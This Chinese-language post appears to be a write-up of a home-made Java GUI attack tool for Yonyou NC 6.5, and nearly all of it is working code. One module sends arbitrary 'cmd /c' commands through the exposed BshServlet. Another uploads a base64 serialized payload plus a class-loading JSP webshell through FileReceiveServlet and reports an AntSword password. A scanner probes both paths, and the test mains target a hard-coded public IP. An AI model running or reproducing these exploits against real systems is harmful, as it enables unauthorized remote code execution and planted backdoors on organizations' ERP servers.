<a name="j4U2f"></a>
## 界面设计模块
```java
package gui;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JOptionPane;


public class Gui_try {
    public static void main(String[] args){
        JFrame frame=new JFrame("用友nc6.5    --by af");  //设置标题啥的,设置整个gui界面
        //frame.setSize(500,400);  //设置整个gui的大小
        JPanel jp=new JPanel(); //设置组件

//        JTextArea txtfield1=new JTextArea (2,10);    //创建文本框
//        txtfield1.setText("输入http://");    //设置文本框的内容

        JLabel l = new JLabel();
        l.setText("url:");   //文本框旁边的字体
        l.setFont(new Font(null, Font.PLAIN, 15));

        JLabel l2 = new JLabel();
        l2.setText("command:");   //文本框旁边的字体
        l2.setFont(new Font(null, Font.PLAIN, 15));

        TextField tf=new TextField("输入http://",30); //输入的框
        TextField tf2=new TextField("执行命令",10); //输入的框

        TextArea ta=new TextArea(25,90);
        TextArea ta2=new TextArea(10,90);


        JButton btn = new JButton("run");
        JButton btn2 = new JButton("一键上shell");
        JButton btn3 = new JButton("run all poc");


        // 添加按钮的点击事件监听器
        btn.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                // 获取到的事件源就是按钮本身
                // JButton btn = (JButton) e.getSource();
                String s= Add_http.http_url(tf.getText().trim());
                String s2=tf2.getText();
//                String a =Test_http2.Send_nc(s);
                if (s.length() < 2 && s2.length() <1){
                    JOptionPane.showMessageDialog(null,"没有输入url或者command","提示",JOptionPane.WARNING_MESSAGE);	//消息对话框
                }else{
                    //ta.append(s+"\n"+s2);
                    ta.append(Test_http2.Send_nc(s,s2)+"\n");
                }
                //将字符串内容设置到文本域中
                //ta.setText(s);

                //追加内容，并换行

                //复制结束后可以清楚文本框的内容
//                tf.setText(null);

                //获取光标，使光标一直在文本框内
                tf.requestFocus();
                System.out.println("按钮被点击");
            }
        });

//        JButton btn2 = new JButton("run");

        btn2.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                // 获取到的事件源就是按钮本身
                // JButton btn = (JButton) e.getSource();

                String s=Add_http.getUrl(tf.getText().trim());
//                String a =Test_http2.Send_nc(s);
                if(s.length() < 2){
                    JOptionPane.showMessageDialog(null,"没有输入url","提示",JOptionPane.WARNING_MESSAGE);	//消息对话框
                }else{
                    ta2.append(test.post(s)+"\n");
                    ta2.append("\n");
                }
                //将字符串内容设置到文本域中
                //ta.setText(s);

                //追加内容，并换行

                //复制结束后可以清楚文本框的内容
//                tf.setText(null);

                //获取光标，使光标一直在文本框内
                tf.requestFocus();
                System.out.println("按钮被点击");
            }
        });

        btn3.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                String s=Add_http.getUrl(tf.getText().trim());
                ta.append(Nc_poc.go_poc(s));

                tf.requestFocus();
                System.out.println("按钮被点击");
            }
        });
        jp.add(l);
//        jp.add(txtfield1);
        jp.add(tf);
        jp.add(btn3);
        jp.add(l2);
        jp.add(tf2);
        jp.add(btn);

//        jp.add(btn2);
        jp.add(ta);
        jp.add(btn2);
//        jp.add(btn2);
        jp.add(ta2);
        frame.add(jp);
        frame.setBounds(800,400,700,700); //显示在windows中的位置
        frame.setVisible(true); //设置了才会显示
    }


}

```
<a name="rp4Qs"></a>
## 命令执行模块
```java
package gui;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * POST请求示例*/
public class Test_http2 {
    public static void main(String [] args){
        Send_nc("http://111.202.44.155:8089/servlet/~ic/bsh.servlet.BshServlet","dir");
    }

    public static String Send_nc(String urlParam,String command) {
        String msg = "";
        try {
            // 1. 获取访问地址URL
            URL url = new URL(urlParam);
            // 2. 创建HttpURLConnection对象
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            /* 3. 设置请求参数等 */
            // 请求方式
            connection.setRequestMethod("POST");
            // 设置连接超时时间
            connection.setConnectTimeout(3000); // 设置是否向 HttpUrlConnection 输出，对于post请求，参数要放在 http 正文内，因此需要设为true，默认为false。
            connection.setDoOutput(true);
            // 设置是否从 HttpUrlConnection读入，默认为true
            connection.setDoInput(true);
            // 设置是否使用缓存
            connection.setUseCaches(false);
            // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
            connection.setInstanceFollowRedirects(true);
            // 设置使用标准编码格式编码参数的名-值对
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); // 添加 HTTP HEAD 中的一些参数。　　　　　　  // JDK8中，HttpURLConnection默认开启Keep-Alive
            // connection.setRequestProperty("Connection", "Keep-Alive");
            // 连接
            connection.connect();
            /* 4. 处理输入输出 */
            // 写入参数到请求中
            String str = String.format("&bsh.script="+"exec(\"cmd /c %s\")",command);
            //String str = String.format("&bsh.script="+"exec(\"%s\")",command);
            String params = str;
            OutputStream out = connection.getOutputStream();
            out.write(params.getBytes());
            out.flush();
            out.close();
            // 从连接中读取响应信息
            int code = connection.getResponseCode();
            if (code == 200) {
                StringBuffer sbf = new StringBuffer();
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(),"UTF-8"));
                String line;
                while ((line = reader.readLine()) != null) {
//                    msg += line + "\n";
                    sbf.append(line + "\n");
                }
                msg = sbf.toString();
                reader.close();
            }else {
                msg = "不存在/servlet/~ic/bsh.servlet.BshServlet，或其他问题";
            }
            // 5. 断开连接
            connection.disconnect();

            String pattern = "<pre[^>]*>([\\s\\S]*)<\\/pre>";

            Pattern p_body = Pattern.compile(pattern, Pattern.CASE_INSENSITIVE);
            Matcher m_body = p_body.matcher(msg);
            if (m_body.find()){
                msg = m_body.group();
            }
            System.out.println(msg);

            // 处理结果
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return msg;
    }
}
```
<a name="HjTf2"></a>
## 文件上传模块
对序列化的cer内容进行base64编码<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1643207848332-2bb2d1ea-741c-4d6c-98bb-6412ac3981b9.png#clientId=u2e216ad4-52b4-4&from=paste&height=106&id=u26bd339c&originHeight=136&originWidth=624&originalType=binary&ratio=1&size=45694&status=done&style=none&taskId=u7693d8ea-e018-4101-93e3-ae6f0e65891&width=485)
```java
package gui;

import java.net.URL;
import java.util.Base64;

import sun.net.www.protocol.http.HttpURLConnection;
/**
 * 主要实现文件上传，和接收方绑定接收后信息导入参数传递
 *
 */
public class test {
    public static byte[] addBytes(byte[] data1, byte[] data2) {
        byte[] data3 = new byte[data1.length + data2.length];
        System.arraycopy(data1, 0, data3, 0, data1.length);
        System.arraycopy(data2, 0, data3, data1.length, data2.length);
        return data3;

    }

    public static String post(String urL) {
        String shell ="No shell";
        try {
            String result = "";
            Base64.Decoder decoder = Base64.getDecoder();
            //InetSocketAddress addr = new InetSocketAddress("localhost",8080);
            String body_1 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAJRklMRV9OQU1FdAANd2ViY29uZmlnLmpzcHQAEFRBUkdFVF9GSUxFX1BBVEh0AA53ZWJhcHBzL25jX3dlYngxMjMxMjMxMjM="; //把字节码进行base64加密，然后解密后存放字节列表中

            byte[] bytes_1 = decoder.decode(body_1);

            String body_2 = "\r\n123ttt<%! class CONSTANT extends ClassLoader{CONSTANT(ClassLoader c){super(c);} public Class conditional(byte[] b){return super.defineClass(b, 0, b.length); } } public byte[] composition(String str) throws Exception {Class base64; byte[] value = null; try {base64=Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] {String.class }).invoke(decoder, new Object[] { str }); } catch (Exception e) {try {base64=Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { str }); } catch (Exception ee) {} } return value; } %> <% String cls = request.getParameter(\"TqnsNcrn\"); if (cls != null) {new CONSTANT(this.getClass().getClassLoader()).conditional(composition(cls)).newInstance().equals(new Object[]{request,response}); } %>";
            byte[] bytes_2 = body_2.getBytes();

            byte[] bytes = addBytes(bytes_1, bytes_2);


            //Proxy proxy = new Proxy(Proxy.Type.HTTP, addr); // http 代理
            URL url = new URL(urL+"/servlet/FileReceiveServlet");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setChunkedStreamingMode(1024 * 1024);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("Charsert", "UTF-8");
            conn.setConnectTimeout(50000);
            conn.setRequestProperty("Content-Type", "application/data");

            conn.getOutputStream().write(bytes);
            conn.getResponseCode(); //需要这样子才能建立http连接

            URL url2 = new URL(urL+"/webconfig.jsp");
            HttpURLConnection conn2 = (HttpURLConnection) url.openConnection();
            int responseCode =conn2.getResponseCode();

            if(responseCode == HttpURLConnection.HTTP_OK) {
                shell = "success!"+"\n"+"webshell:  "+urL+"/webconfig.jsp"+"\n"+"Antsword-connect：TqnsNcrn";
                System.out.println(shell);
            }else {
                shell ="不存在/servlet/FileReceiveServlet，或其他问题";
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        return shell;
    }

    public static void main(String[] args) {
        post("http://111.202.44.155:8089");
    }

}
```
<a name="Cr3Ow"></a>
## poc探测模块
```java
package gui;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class Nc_poc {
    public static void main(String[] args) {
        go_poc("http://114.114.114.114");
    }

    public static String go_poc(String url){
        String str = "";
        String urlParam ="";
        String[] pocs={"/servlet/~ic/bsh.servlet.BshServlet","/servlet/FileReceiveServlet"};
        for(int i=0;i<pocs.length;i++){
            urlParam = url + pocs[i];
            str = str+test_poc(urlParam);
            System.out.println(urlParam);
        }
        return str;
    }
    public static String test_poc(String urlParam){
        String msg ="";
        try {
            // 1. 获取访问地址URL
            URL url = new URL(urlParam);
            // 2. 创建HttpURLConnection对象
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            /* 3. 设置请求参数等 */
            // 请求方式
            connection.setRequestMethod("POST");
            // 设置连接超时时间
            connection.setConnectTimeout(3000); // 设置是否向 HttpUrlConnection 输出，对于post请求，参数要放在 http 正文内，因此需要设为true，默认为false。
            connection.setDoOutput(true);
            // 设置是否从 HttpUrlConnection读入，默认为true
            connection.setDoInput(true);
            // 设置是否使用缓存
            connection.setUseCaches(false);
            // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
            connection.setInstanceFollowRedirects(true);
            // 设置使用标准编码格式编码参数的名-值对
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); // 添加 HTTP HEAD 中的一些参数。　　　　　　  // JDK8中，HttpURLConnection默认开启Keep-Alive
            // connection.setRequestProperty("Connection", "Keep-Alive");
            // 连接
            connection.connect();
            OutputStream out = connection.getOutputStream();
            out.flush();
            out.close();
            // 从连接中读取响应信息
            int code = connection.getResponseCode();
            if (code == 200) {
                msg ="[*]  "+urlParam+"    maybe have vuln"+"\n";
                System.out.println(msg);
                return msg;
            }else {
            }
            // 5. 断开连接
            connection.disconnect();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return msg;
    }
}

```

<a name="nASjA"></a>
## 实战效果
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1643207560338-b21bbfe0-5955-4ab4-9186-162266fbc6ce.png#clientId=u2e216ad4-52b4-4&from=paste&height=501&id=uf8491d91&originHeight=700&originWidth=700&originalType=binary&ratio=1&size=64707&status=done&style=none&taskId=u13a88446-1110-417b-8a67-fedcec22118&width=501)
